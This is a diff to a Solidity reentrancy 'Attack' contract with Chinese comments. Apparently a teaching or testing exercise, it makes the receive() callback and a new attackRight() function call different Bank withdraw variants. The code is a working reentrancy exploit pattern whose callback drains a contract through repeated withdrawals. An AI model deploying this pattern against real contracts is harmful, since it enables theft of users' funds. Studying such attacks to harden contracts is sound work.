@@ -13,7 +13,7 @@ contract Attack {
     // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
     receive() external payable {
         if (bank.getBalance() >= 1 ether) {
-            bank.withdraw();
+            bank.withdrawRight2();
         }
     }
 
@@ -21,7 +21,14 @@ contract Attack {
     function attack() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         bank.deposit{value: 1 ether}();
-        bank.withdraw();
+        bank.withdrawAttack();
+    }
+
+    // 攻击函数，调用时 msg.value 设为 1 ether
+    function attackRight() external payable {
+        require(msg.value == 1 ether, "Require 1 Ether to attack");
+        bank.deposit{value: 1 ether}();
+        bank.withdrawRight2();
     }
 
     // 获取本合约的余额
